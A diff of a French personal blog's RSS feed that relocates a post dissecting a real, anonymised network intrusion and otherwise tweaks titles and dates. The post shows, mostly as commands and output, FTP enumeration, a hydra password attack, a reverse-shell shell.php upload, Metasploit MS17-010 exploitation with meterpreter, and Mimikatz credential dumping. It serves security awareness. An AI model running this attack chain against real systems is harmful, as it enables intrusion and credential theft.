@@ -8,9 +8,139 @@
     <copyright></copyright>
     <ttl>60</ttl>
 <item>
-<pubDate>2020-06-16T11:24:56Z 17:56:46 CET</pubDate>
+<pubDate>2019-05-18T11:24:56Z 18:01:13 CET</pubDate>
+  <category>2019/05/18/6</category>
+  <title>Anatomie d'une attaque informatique</title>
+  <link>http://3r1c.net/posts/2019-05-18-anatomie-dune-attaque-informatique.txt</link>
+  <description>
+    <![CDATA[
+<pre style='border: 0; white-space: pre-wrap; word-break: break-word;'>Au cours de cet article, je vous propose de décortiquer le processus d&#39;une attaque informatique à distance. Il s&#39;agit d&#39;un cas réel, pour lequel l&#39;entreprise a entrepris des actions correctives. Pour des raisons éthiques, toute information potentiellement sensible a été anonymisée ou supprimée.
+
+Comme l&#39;indique le schéma ci-après, un attaquant (à droite et en rouge) connecté à internet, tente de s&#39;introduire sur le réseau de l&#39;entreprise (à gauche).
+
+![](img/20180217102110-attaque-informatique.png)
+
+#### Phase 1 - Découverte
+En premier lieu l&#39;attaquant va énumérer les services logiciels fournis par l&#39;entreprise sur internet. Bien souvent le management n&#39;a pas connaissance de l&#39;existence de ses services, et des risques encourus
+L&#39;attaquant découvre :
+
+- Un site internet
+- Un serveur de transfert de fichiers (FTP)
+
+Le serveur FTP est accessible en mode _anonyme_, ce qui permet une connexion sans pouvoir utiliser les fonctions de transfert de fichier. On peut considérer que le mode anonyme est &quot;sécurisé&quot;. Toutefois il permet d&#39;obtenir une information qui peut paraître anodine, mais qui a une grande importance pour la suite : le nom de compte d&#39;un utilisateur &quot;administrateur&quot; peut être découvert lors d&#39;une connexion anonyme.
+
+	root@attaquant:~ $ ftp ftp.entreprise.fr
+	Connected to ftp.entreprise.fr.
+	220 xxx.xxx.xxx.xxx FTP server ready
+	Name (ftp.entreprise.fr:root): anonymous
+	331 Anonymous login ok, send your complete email address as your password
+	Password:
+	230 Anonymous access granted, restrictions apply
+	Remote system type is UNIX.
+	Using binary mode to transfer files.
+	ftp&gt; passive
+	Passive mode on.
+
+La commande `ls -lha` donne l&#39;information concernant la présence d&#39;un compte &quot;admin&quot; sur le serveur FTP.
+
+	ftp&gt; ls -lha
+	227 Entering Passive Mode
+	150 Opening ASCII mode data connection for file list
+	drwxr-s---   2 admin    group       4.0k Dec  6  2017 .
+	drwxr-s---   2 admin    group       4.0k Dec  7  2017 ..
+	226 Transfer complete
+	ftp&gt;
+
+#### Phase 2 - tentative d&#39;accès non autorisé
+L&#39;attaquant sait désormais qu&#39;une personne s&#39;identifie auprès du serveur en tant que &quot;admin&quot;.
+Il va mener sur ce compte une simple attaque basée sur un dictionnaire de mots de passe. Ces dictionnaires sont librement téléchargeables sur le web.
+
+Grâce à des outils comme **hydra** ou **medusa**, l&#39;attaquant obtient le mot de passe du compte FTP admin.
+
+    ACCOUNT FOUND: [ftp] Host : xxx.xxx.xxx.xxx
+    User: admin Password: tintin [SUCCESS]
+
+#### Phase 3 - obtenir un accès plus complet au serveur
+Désormais l&#39;attaquant en tant qu&#39;admin, possède des permissions d&#39;écriture sur le serveur web.
+Il lui est donc permis d&#39;envoyer sur le serveur une backdoor qui établira une connexion vers sa machine quand elle sera exécutée.
+
+
+	ftp&gt; cd html
+	250 CWD command successful
+	ftp&gt; put shell.php
+	local: shell.php remote: shell.php
+	227 Entering Passive Mode.
+	150 Opening BINARY mode data connection for shell.php
+	226 Transfer complete
+	1113 bytes sent in 0.00 secs (14.9499 MB/s)
+
+L&#39;éxécution de shell.php initie une connexion vers la machine de l&#39;attaquant. Ce dernier dispose ainsi d&#39;un shell sur le serveur (et plus seulement un accès FTP) qui lui permet de mener d&#39;autres actions sur le réseau interne de l&#39;entreprise.
+
+
+#### Phase 4 : identifications des machines du réseau et de leurs vulnérabilités
+L&#39;attaquant balaie et identifie les machines du réseau. Il découvre un serveur Active Directory vulnérable à MS17-010.
+
+	msf &gt; use auxiliary/scanner/smb/smb_ms17_010
+	msf auxiliary(scanner/smb/smb_ms17_010) &gt; set RSHOSTS xxx.xxx.xxx.xxx/24
+	rhosts =&gt; xxx.xxx.xxx.xxx/24
+	msf auxiliary(scanner/smb/smb_ms17_010) &gt; run
+	[+] xxx.xxx.xxx.xxx:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard
+	[*] Scanned 1 of 1 hosts (100% complete)
+	[*] Auxiliary module execution completed
+
+#### Phase 5 : exploitation de la vulnérabilité MS17-010
+Grâce au framework metasploit, l&#39;attaquant exploite la vulnérabilité MS17-010 non corrigée et obtient un accès au serveur Active Directory.
+
+	msf auxiliary(scanner/smb/smb_ms17_010) &gt; use exploit/windows/smb/ms17_010_psexec
+	msf exploit(windows/smb/ms17_010_psexec) &gt; set RHOST xxx.xxx.xxx.xxx
+	msf exploit(windows/smb/ms17_010_psexec) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
+	msf exploit(windows/smb/ms17_010_psexec) &gt; set LPORT 443
+	msf exploit(windows/smb/ms17_010_psexec) &gt; run
+	[*] Started reverse TCP handler on xxx.xxx.xxx.xxx:443
+	[*] xxx.xxx.xxx.xxx:445 - Target OS: Windows Server 2008 R2 Standard 7601 Service Pack 1
+	[*] xxx.xxx.xxx.xxx:445 - Built a write-what-where primitive...
+	[+] xxx.xxx.xxx.xxx:445 - Overwrite complete... SYSTEM session obtained!
+	[*] xxx.xxx.xxx.xxx:445 - Selecting PowerShell target
+	[*] xxx.xxx.xxx.xxx:445 - Executing the payload...
+	[+] xxx.xxx.xxx.xxx:445 - Service start timed out, OK if running a command or non-service executable...
+	[*] Sending stage (179779 bytes) to xxx.xxx.xxx.xxx
+	[*] Meterpreter session 3 opened (xxx.xxx.xxx.xxx:443 -&gt; xxx.xxx.xxx.xxx:46491) at 2018-02-10 15:20:38
+	meterpreter &gt; background
+	[*] Backgrounding session 3...
+
+#### Phase 6 : obtention du mot de passe administrateur du domaine
+Grâce à Mimikatz l&#39;attaquant obtient le mot de passe administrateur du domaine, stocké en clair dans la mémoire de la machine.
+
+	meterpreter&gt; load Mimikatz
+	meterpreter&gt; wdigest
+	0;1368385624  Kerberos   DOMAINE     netadmin       	 1234
+	0;2500325002  Kerberos   DOMAINE     user1        	 password1
+	0;68817461    Kerberos   DOMAINE     user2          	 password2
+	0;2599386119  Kerberos   DOMAINE     user3		password3
+	0;2600098700  Kerberos   DOMAINE     administrateur	Very$ecureP@ssw0rdVeryL0ngAndDifficultToGuess
+	0;2581308498  Kerberos   DOMAINE     user8         	password8
+	0;2589349129  Kerberos   DOMAINE     user4     		password4
+	0;2597681195  Kerberos   DOMAINE     user5      	password5
+	0;2597641064  Kerberos   DOMAINE     user6         	password6
+	0;2595339032  Kerberos   DOMAINE     user7         	password7
+
+
+L&#39;accès administrateur du domaine étant obtenu, l&#39;attaquant poursuit ses investigations sur l&#39;ensemble des systèmes du réseau, à la recherche d&#39;information sensibles.
+
+#### Conclusion
+
+L’enchaînement de plusieurs vulnérabilités peut mener à la compromission d&#39;un réseau informatique  : tester et auditer votre sécurité.
+
+
+Tags: pentest</pre>]]>
+  </description>
+  <author>3r1c</author>
+  <guid>http://3r1c.net/posts/2019-05-18-anatomie-dune-attaque-informatique.txt</guid>
+  </item>
+<item>
+<pubDate>2020-06-16T11:24:56Z 18:01:13 CET</pubDate>
   <category>2020/06/16/2</category>
-  <title># htb blunder</title>
+  <title>htb blunder</title>
   <link>http://3r1c.net/posts/2020-06-16-blunder.txt</link>
   <description>
     <![CDATA[
@@ -389,9 +519,9 @@ cat root.txt
   <guid>http://3r1c.net/posts/2020-06-16-blunder.txt</guid>
   </item>
 <item>
-<pubDate>2020-09-02T10:21:56Z 17:56:46 CET</pubDate>
+<pubDate>2020-09-02T10:21:56Z 18:01:13 CET</pubDate>
   <category>2020/09/02/3</category>
-  <title># buff</title>
+  <title>buff</title>
   <link>http://3r1c.net/posts/2020-09-02-buff.txt</link>
   <description>
     <![CDATA[
@@ -533,9 +663,9 @@ https://p0i5on8.github.io/posts/hackthebox-buff/
   <guid>http://3r1c.net/posts/2020-09-02-buff.txt</guid>
   </item>
 <item>
-<pubDate>2020-09-29T11:24:56Z 17:56:46 CET</pubDate>
+<pubDate>2020-09-29T11:24:56Z 18:01:13 CET</pubDate>
   <category>2020/09/29/2</category>
-  <title># htb admirer</title>
+  <title>htb admirer</title>
   <link>http://3r1c.net/posts/2020-09-29-admirer.txt</link>
   <description>
     <![CDATA[
@@ -925,9 +1055,9 @@ Et notre netcat reçoit la connexion en retour. Nous sommes root.
   <guid>http://3r1c.net/posts/2020-09-29-admirer.txt</guid>
   </item>
 <item>
-<pubDate>2020-10-29T11:24:56Z 17:56:46 CET</pubDate>
+<pubDate>2020-10-29T11:24:56Z 18:01:13 CET</pubDate>
   <category>2020/10/29/4</category>
-  <title># htb fuse</title>
+  <title>htb fuse</title>
   <link>http://3r1c.net/posts/2020-10-29-fuse.txt</link>
   <description>
     <![CDATA[
@@ -1335,9 +1465,9 @@ Successfully loaded driver
   <guid>http://3r1c.net/posts/2020-10-29-fuse.txt</guid>
   </item>
 <item>
-<pubDate>2022-02-17T11:24:56Z 17:56:46 CET</pubDate>
+<pubDate>2022-02-17T11:24:56Z 18:01:13 CET</pubDate>
   <category>2022/02/17/4</category>
-  <title># htb blackfield</title>
+  <title>htb blackfield</title>
   <link>http://3r1c.net/posts/2022-02-17-blackfield-hackthebox.txt</link>
   <description>
     <![CDATA[
@@ -1999,9 +2129,9 @@ On peut vérifier que le compte _support_ est bien &quot;vulnérable&quot; à l&
   <guid>http://3r1c.net/posts/2022-02-17-blackfield-hackthebox.txt</guid>
   </item>
 <item>
-<pubDate>2023-08-17T11:24:56Z 17:56:46 CET</pubDate>
+<pubDate>2023-08-17T11:24:56Z 18:01:13 CET</pubDate>
   <category>2023/08/17/4</category>
-  <title># htb Busqueda</title>
+  <title>htb Busqueda</title>
   <link>http://3r1c.net/posts/2023-08-17-busqueda.txt</link>
   <description>
     <![CDATA[
@@ -2293,7 +2423,7 @@ $ nc -nlvp 9002
   <guid>http://3r1c.net/posts/2023-08-17-busqueda.txt</guid>
   </item>
 <item>
-<pubDate>2023-10-04 17:56:46 CET</pubDate>
+<pubDate>2023-10-04 18:01:13 CET</pubDate>
   <category>2023/10/04/3</category>
   <title>Recommandations de recharge de véhicule électrique</title>
   <link>http://3r1c.net/posts/2023-10-04-reco-recharge-vehicule-electrique.txt</link>
@@ -2311,7 +2441,7 @@ batterie d&#39;un véhucule électrique afin de conserver un bon niveau de sant�
   <guid>http://3r1c.net/posts/2023-10-04-reco-recharge-vehicule-electrique.txt</guid>
   </item>
 <item>
-<pubDate>2023-10-08 17:56:46 CET</pubDate>
+<pubDate>2023-10-08 18:01:13 CET</pubDate>
   <category>2023/10/08/7</category>
   <title>Véhicule électrique : un véhicule vert ?</title>
   <link>http://3r1c.net/posts/2023-10-08-vehicule-electrique-vert.txt</link>
@@ -2336,7 +2466,7 @@ votre VE :)</pre>]]>
   <guid>http://3r1c.net/posts/2023-10-08-vehicule-electrique-vert.txt</guid>
   </item>
 <item>
-<pubDate>2023-10-31 17:56:46 CET</pubDate>
+<pubDate>2023-10-31 18:01:13 CET</pubDate>
   <category>2023/10/31/2</category>
   <title>Halloween petites infos</title>
   <link>http://3r1c.net/posts/2023-10-31-halloween-cest-quoi.txt</link>
@@ -2377,7 +2507,7 @@ quelques infos. Voilà c&#39;était la minute culturelle du mois :-))</pre>]]>
   <guid>http://3r1c.net/posts/2023-10-31-halloween-cest-quoi.txt</guid>
   </item>
 <item>
-<pubDate>2023-11-02 17:56:46 CET</pubDate>
+<pubDate>2023-11-02 18:01:13 CET</pubDate>
   <category>2023/11/02/4</category>
   <title>Amulette de sommeil</title>
   <link>http://3r1c.net/posts/2023-11-02-amulette-de-sommeil.txt</link>
@@ -2398,7 +2528,7 @@ physique et mental. Mettre tous les ingrédients dans le sachet :
   <guid>http://3r1c.net/posts/2023-11-02-amulette-de-sommeil.txt</guid>
   </item>
 <item>
-<pubDate>2023-11-09 17:56:46 CET</pubDate>
+<pubDate>2023-11-09 18:01:13 CET</pubDate>
   <category>2023/11/09/4</category>
   <title>Véhicule électrique vert ? (2)</title>
   <link>http://3r1c.net/posts/2023-11-09-vehicule-electrique-vert-2.txt</link>
@@ -2421,7 +2551,7 @@ nocifs ? </pre>]]>
   <guid>http://3r1c.net/posts/2023-11-09-vehicule-electrique-vert-2.txt</guid>
   </item>
 <item>
-<pubDate>2023-11-10 17:56:46 CET</pubDate>
+<pubDate>2023-11-10 18:01:13 CET</pubDate>
   <category>2023/11/10/5</category>
   <title>email auto hébergé</title>
   <link>http://3r1c.net/posts/2023-11-10-email-auto-heberge.txt</link>
@@ -2440,7 +2570,7 @@ postgrey serait une solution palliative ?
   <guid>http://3r1c.net/posts/2023-11-10-email-auto-heberge.txt</guid>
   </item>
 <item>
-<pubDate>2023-11-14 17:56:46 CET</pubDate>
+<pubDate>2023-11-14 18:01:13 CET</pubDate>
   <category>2023/11/14/2</category>
   <title>Dégugeulisation</title>
   <link>http://3r1c.net/posts/2023-11-14-degougueulisation.txt</link>
@@ -2476,7 +2606,7 @@ LineageOS.
   <guid>http://3r1c.net/posts/2023-11-14-degougueulisation.txt</guid>
   </item>
 <item>
-<pubDate>2023-11-15 17:56:46 CET</pubDate>
+<pubDate>2023-11-15 18:01:13 CET</pubDate>
   <category>2023/11/15/3</category>
   <title>Le "savoir procéder"</title>
   <link>http://3r1c.net/posts/2023-11-15-savoir-proceder.txt</link>
@@ -2507,7 +2637,7 @@ sont malheureusement résolument tournés vers le &quot;savoir faire&quot;. </pr
   <guid>http://3r1c.net/posts/2023-11-15-savoir-proceder.txt</guid>
   </item>
 <item>
-<pubDate>2023-11-16 17:56:46 CET</pubDate>
+<pubDate>2023-11-16 18:01:13 CET</pubDate>
   <category>2023/11/16/4</category>
   <title>Le monde de demain</title>
   <link>http://3r1c.net/posts/2023-11-16-le-monde-de-demain-draft.txt</link>
@@ -2525,137 +2655,7 @@ sinon ce serait pas drôle :)
   <guid>http://3r1c.net/posts/2023-11-16-le-monde-de-demain-draft.txt</guid>
   </item>
 <item>
-<pubDate>2019-05-18T11:24:56Z 17:56:46 CET</pubDate>
-  <category>2019/05/18/6</category>
-  <title># Anatomie d'une attaque informatique</title>
-  <link>http://3r1c.net/posts/anatomie-dune-attaque-informatique.txt</link>
-  <description>
-    <![CDATA[
-<pre style='border: 0; white-space: pre-wrap; word-break: break-word;'>Au cours de cet article, je vous propose de décortiquer le processus d&#39;une attaque informatique à distance. Il s&#39;agit d&#39;un cas réel, pour lequel l&#39;entreprise a entrepris des actions correctives. Pour des raisons éthiques, toute information potentiellement sensible a été anonymisée ou supprimée.
-
-Comme l&#39;indique le schéma ci-après, un attaquant (à droite et en rouge) connecté à internet, tente de s&#39;introduire sur le réseau de l&#39;entreprise (à gauche).
-
-![](img/20180217102110-attaque-informatique.png)
-
-#### Phase 1 - Découverte
-En premier lieu l&#39;attaquant va énumérer les services logiciels fournis par l&#39;entreprise sur internet. Bien souvent le management n&#39;a pas connaissance de l&#39;existence de ses services, et des risques encourus
-L&#39;attaquant découvre :
-
-- Un site internet
-- Un serveur de transfert de fichiers (FTP)
-
-Le serveur FTP est accessible en mode _anonyme_, ce qui permet une connexion sans pouvoir utiliser les fonctions de transfert de fichier. On peut considérer que le mode anonyme est &quot;sécurisé&quot;. Toutefois il permet d&#39;obtenir une information qui peut paraître anodine, mais qui a une grande importance pour la suite : le nom de compte d&#39;un utilisateur &quot;administrateur&quot; peut être découvert lors d&#39;une connexion anonyme.
-
-	root@attaquant:~ $ ftp ftp.entreprise.fr
-	Connected to ftp.entreprise.fr.
-	220 xxx.xxx.xxx.xxx FTP server ready
-	Name (ftp.entreprise.fr:root): anonymous
-	331 Anonymous login ok, send your complete email address as your password
-	Password:
-	230 Anonymous access granted, restrictions apply
-	Remote system type is UNIX.
-	Using binary mode to transfer files.
-	ftp&gt; passive
-	Passive mode on.
-
-La commande `ls -lha` donne l&#39;information concernant la présence d&#39;un compte &quot;admin&quot; sur le serveur FTP.
-
-	ftp&gt; ls -lha
-	227 Entering Passive Mode
-	150 Opening ASCII mode data connection for file list
-	drwxr-s---   2 admin    group       4.0k Dec  6  2017 .
-	drwxr-s---   2 admin    group       4.0k Dec  7  2017 ..
-	226 Transfer complete
-	ftp&gt;
-
-#### Phase 2 - tentative d&#39;accès non autorisé
-L&#39;attaquant sait désormais qu&#39;une personne s&#39;identifie auprès du serveur en tant que &quot;admin&quot;.
-Il va mener sur ce compte une simple attaque basée sur un dictionnaire de mots de passe. Ces dictionnaires sont librement téléchargeables sur le web.
-
-Grâce à des outils comme **hydra** ou **medusa**, l&#39;attaquant obtient le mot de passe du compte FTP admin.
-
-    ACCOUNT FOUND: [ftp] Host : xxx.xxx.xxx.xxx
-    User: admin Password: tintin [SUCCESS]
-
-#### Phase 3 - obtenir un accès plus complet au serveur
-Désormais l&#39;attaquant en tant qu&#39;admin, possède des permissions d&#39;écriture sur le serveur web.
-Il lui est donc permis d&#39;envoyer sur le serveur une backdoor qui établira une connexion vers sa machine quand elle sera exécutée.
-
-
-	ftp&gt; cd html
-	250 CWD command successful
-	ftp&gt; put shell.php
-	local: shell.php remote: shell.php
-	227 Entering Passive Mode.
-	150 Opening BINARY mode data connection for shell.php
-	226 Transfer complete
-	1113 bytes sent in 0.00 secs (14.9499 MB/s)
-
-L&#39;éxécution de shell.php initie une connexion vers la machine de l&#39;attaquant. Ce dernier dispose ainsi d&#39;un shell sur le serveur (et plus seulement un accès FTP) qui lui permet de mener d&#39;autres actions sur le réseau interne de l&#39;entreprise.
-
-
-#### Phase 4 : identifications des machines du réseau et de leurs vulnérabilités
-L&#39;attaquant balaie et identifie les machines du réseau. Il découvre un serveur Active Directory vulnérable à MS17-010.
-
-	msf &gt; use auxiliary/scanner/smb/smb_ms17_010
-	msf auxiliary(scanner/smb/smb_ms17_010) &gt; set RSHOSTS xxx.xxx.xxx.xxx/24
-	rhosts =&gt; xxx.xxx.xxx.xxx/24
-	msf auxiliary(scanner/smb/smb_ms17_010) &gt; run
-	[+] xxx.xxx.xxx.xxx:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard
-	[*] Scanned 1 of 1 hosts (100% complete)
-	[*] Auxiliary module execution completed
-
-#### Phase 5 : exploitation de la vulnérabilité MS17-010
-Grâce au framework metasploit, l&#39;attaquant exploite la vulnérabilité MS17-010 non corrigée et obtient un accès au serveur Active Directory.
-
-	msf auxiliary(scanner/smb/smb_ms17_010) &gt; use exploit/windows/smb/ms17_010_psexec
-	msf exploit(windows/smb/ms17_010_psexec) &gt; set RHOST xxx.xxx.xxx.xxx
-	msf exploit(windows/smb/ms17_010_psexec) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
-	msf exploit(windows/smb/ms17_010_psexec) &gt; set LPORT 443
-	msf exploit(windows/smb/ms17_010_psexec) &gt; run
-	[*] Started reverse TCP handler on xxx.xxx.xxx.xxx:443
-	[*] xxx.xxx.xxx.xxx:445 - Target OS: Windows Server 2008 R2 Standard 7601 Service Pack 1
-	[*] xxx.xxx.xxx.xxx:445 - Built a write-what-where primitive...
-	[+] xxx.xxx.xxx.xxx:445 - Overwrite complete... SYSTEM session obtained!
-	[*] xxx.xxx.xxx.xxx:445 - Selecting PowerShell target
-	[*] xxx.xxx.xxx.xxx:445 - Executing the payload...
-	[+] xxx.xxx.xxx.xxx:445 - Service start timed out, OK if running a command or non-service executable...
-	[*] Sending stage (179779 bytes) to xxx.xxx.xxx.xxx
-	[*] Meterpreter session 3 opened (xxx.xxx.xxx.xxx:443 -&gt; xxx.xxx.xxx.xxx:46491) at 2018-02-10 15:20:38
-	meterpreter &gt; background
-	[*] Backgrounding session 3...
-
-#### Phase 6 : obtention du mot de passe administrateur du domaine
-Grâce à Mimikatz l&#39;attaquant obtient le mot de passe administrateur du domaine, stocké en clair dans la mémoire de la machine.
-
-	meterpreter&gt; load Mimikatz
-	meterpreter&gt; wdigest
-	0;1368385624  Kerberos   DOMAINE     netadmin       	 1234
-	0;2500325002  Kerberos   DOMAINE     user1        	 password1
-	0;68817461    Kerberos   DOMAINE     user2          	 password2
-	0;2599386119  Kerberos   DOMAINE     user3		password3
-	0;2600098700  Kerberos   DOMAINE     administrateur	Very$ecureP@ssw0rdVeryL0ngAndDifficultToGuess
-	0;2581308498  Kerberos   DOMAINE     user8         	password8
-	0;2589349129  Kerberos   DOMAINE     user4     		password4
-	0;2597681195  Kerberos   DOMAINE     user5      	password5
-	0;2597641064  Kerberos   DOMAINE     user6         	password6
-	0;2595339032  Kerberos   DOMAINE     user7         	password7
-
-
-L&#39;accès administrateur du domaine étant obtenu, l&#39;attaquant poursuit ses investigations sur l&#39;ensemble des systèmes du réseau, à la recherche d&#39;information sensibles.
-
-#### Conclusion
-
-L’enchaînement de plusieurs vulnérabilités peut mener à la compromission d&#39;un réseau informatique  : tester et auditer votre sécurité.
-
-
-Tags: pentest</pre>]]>
-  </description>
-  <author>3r1c</author>
-  <guid>http://3r1c.net/posts/anatomie-dune-attaque-informatique.txt</guid>
-  </item>
-<item>
-<pubDate>2023-11-18T11:24:56Z 17:56:46 CET</pubDate>
+<pubDate>2023-11-18T11:24:56Z 18:01:13 CET</pubDate>
   <category>2023/11/18/6</category>
   <title># Antisèche vim</title>
   <link>http://3r1c.net/posts/anti-seche-vim.txt</link>
@@ -2790,9 +2790,9 @@ https://blog.sanctum.geek.nz/vim-anti-patterns/</pre>]]>
   <guid>http://3r1c.net/posts/anti-seche-vim.txt</guid>
   </item>
 <item>
-<pubDate>2022-07-18T11:24:56Z 17:56:46 CET</pubDate>
+<pubDate>2022-07-18T11:24:56Z 18:01:13 CET</pubDate>
   <category>2022/07/18/1</category>
-  <title># Chiffrer ses backups dans le cloud</title>
+  <title>Chiffrer ses backups dans le cloud</title>
   <link>http://3r1c.net/posts/chiffrement-des-backups-dans-le-cloud.txt</link>
   <description>
     <![CDATA[
@@ -2847,9 +2847,9 @@ Tags: backup, cloud, rclone, gocryptfs</pre>]]>
   <guid>http://3r1c.net/posts/chiffrement-des-backups-dans-le-cloud.txt</guid>
   </item>
 <item>
-<pubDate>2021-03-18T11:24:56Z 17:56:46 CET</pubDate>
+<pubDate>2021-03-18T11:24:56Z 18:01:13 CET</pubDate>
   <category>2021/03/18/4</category>
-  <title># Configurer un umask + securisé</title>
+  <title>Configurer un umask + securisé</title>
   <link>http://3r1c.net/posts/configurer-un-umask-plus-securise.txt</link>
   <description>
     <![CDATA[
@@ -2935,7 +2935,7 @@ Tags: linux, security, umask, ansible</pre>]]>
   <guid>http://3r1c.net/posts/configurer-un-umask-plus-securise.txt</guid>
   </item>
 <item>
-<pubDate>2023-10-16T18:04:21Z 17:56:46 CET</pubDate>
+<pubDate>2023-10-16T18:04:21Z 18:01:13 CET</pubDate>
   <category>2023/10/16/1</category>
   <title>De-googlisation</title>
   <link>http://3r1c.net/posts/degougueulisation.txt</link>
@@ -2983,9 +2983,9 @@ VPS en tant que relai smtp. Ca ne simplifie pas les choses.</pre>]]>
   <guid>http://3r1c.net/posts/degougueulisation.txt</guid>
   </item>
 <item>
-<pubDate>2018-01-02T11:24:56Z 17:56:46 CET</pubDate>
+<pubDate>2018-01-02T11:24:56Z 18:01:13 CET</pubDate>
   <category>2018/01/02/2</category>
-  <title># [en] eCPPT course and exam review</title>
+  <title>[en] eCPPT course and exam review</title>
   <link>http://3r1c.net/posts/ecppt-course-and-exam-review.txt</link>
   <description>
     <![CDATA[
@@ -3053,9 +3053,9 @@ Tags: eCPPT, pentest</pre>]]>
   <guid>http://3r1c.net/posts/ecppt-course-and-exam-review.txt</guid>
   </item>
 <item>
-<pubDate>2023-10-26T10:20:00Z 17:56:46 CET</pubDate>
+<pubDate>2023-10-26T10:20:00Z 18:01:13 CET</pubDate>
   <category>2023/10/26/4</category>
-  <title># How to Hire Me</title>
+  <title>How to Hire Me</title>
   <link>http://3r1c.net/posts/how-to-hire-me.txt</link>
   <description>
     <![CDATA[
@@ -3095,9 +3095,9 @@ Please do not send email to my work accounts.</pre>]]>
   <guid>http://3r1c.net/posts/how-to-hire-me.txt</guid>
   </item>
 <item>
-<pubDate>2020-06-18T11:24:56Z 17:56:46 CET</pubDate>
+<pubDate>2020-06-18T11:24:56Z 18:01:13 CET</pubDate>
   <category>2020/06/18/4</category>
-  <title># Home made  nas</title>
+  <title>Home made  nas</title>
   <link>http://3r1c.net/posts/nas-maison-raspberry-pi4-quad-sata.txt</link>
   <description>
     <![CDATA[
@@ -3291,9 +3291,9 @@ Et cette fois-ci je peux monter le raid :
   <guid>http://3r1c.net/posts/nas-maison-raspberry-pi4-quad-sata.txt</guid>
   </item>
 <item>
-<pubDate>2021-11-18T11:24:56Z 17:56:46 CET</pubDate>
+<pubDate>2021-11-18T11:24:56Z 18:01:13 CET</pubDate>
   <category>2021/11/18/4</category>
-  <title># Outils et services</title>
+  <title>Outils et services</title>
   <link>http://3r1c.net/posts/outils-et-services.txt</link>
   <description>
     <![CDATA[
@@ -3341,9 +3341,9 @@ Et cette fois-ci je peux monter le raid :
   <guid>http://3r1c.net/posts/outils-et-services.txt</guid>
   </item>
 <item>
-<pubDate>2023-11-07T11:24:56Z 17:56:46 CET</pubDate>
+<pubDate>2023-11-07T11:24:56Z 18:01:13 CET</pubDate>
   <category>2023/11/07/2</category>
-  <title># Wrap Existing Text at 80 Characters in Vim</title>
+  <title>Wrap Existing Text at 80 Characters in Vim</title>
   <link>http://3r1c.net/posts/wrap-existing-test-at-80-char-in-vim.txt</link>
   <description>
     <![CDATA[
